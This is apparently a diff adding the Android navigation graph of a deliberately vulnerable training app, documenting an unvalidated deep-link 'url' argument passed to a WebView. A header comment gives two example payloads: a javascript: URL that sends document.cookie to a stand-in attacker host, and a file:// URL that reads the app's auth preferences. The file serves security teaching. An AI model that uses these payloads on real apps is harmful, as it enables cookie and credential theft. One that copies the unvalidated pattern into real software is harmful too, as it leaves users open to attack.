@@ -1,0 +1,51 @@
+<?xml version="1.0" encoding="utf-8"?>
+<!--
+  VULN: nav-component-complementary-argument (blog: nav-component-complementary-argument.md)
+
+  The "url" argument is populated from the deep-link URI query parameter
+  without validation. When passed to WebViewFragment, it loads the URL
+  directly — enabling file:// reads and javascript: execution via:
+
+    vulnlab://nav?url=javascript:fetch('https://attacker.com/?c='+document.cookie)
+    vulnlab://nav?url=file:///data/data/com.vulnlab.app/shared_prefs/auth_prefs.xml
+-->
+<navigation xmlns:android="http://schemas.android.com/apk/res/android"
+    xmlns:app="http://schemas.android.com/apk/res-auto"
+    android:id="@+id/nav_graph"
+    app:startDestination="@id/homeFragment">
+
+    <fragment
+        android:id="@+id/homeFragment"
+        android:name="com.vulnlab.app.fragments.HomeFragment"
+        android:label="Home">
+        <action
+            android:id="@+id/action_home_to_webview"
+            app:destination="@id/webViewFragment" />
+    </fragment>
+
+    <fragment
+        android:id="@+id/webViewFragment"
+        android:name="com.vulnlab.app.fragments.WebViewFragment"
+        android:label="WebView">
+
+        <!-- VULN: "url" argument populated from deep-link — no validation -->
+        <argument
+            android:name="url"
+            app:argType="string"
+            android:defaultValue="https://app.vulnlabapp.example.com/" />
+
+        <!-- Deep link: vulnlab://nav?url=<attacker_controlled> -->
+        <deepLink
+            android:id="@+id/deepLink_webview"
+            app:uri="vulnlab://nav?url={url}" />
+    </fragment>
+
+    <fragment
+        android:id="@+id/adminFragment"
+        android:name="com.vulnlab.app.fragments.AdminFragment"
+        android:label="Admin Panel">
+        <!-- Internal fragment — not meant to be reachable from deep links
+             but fragment-injection via PreferenceActivity bypasses this -->
+    </fragment>
+
+</navigation>
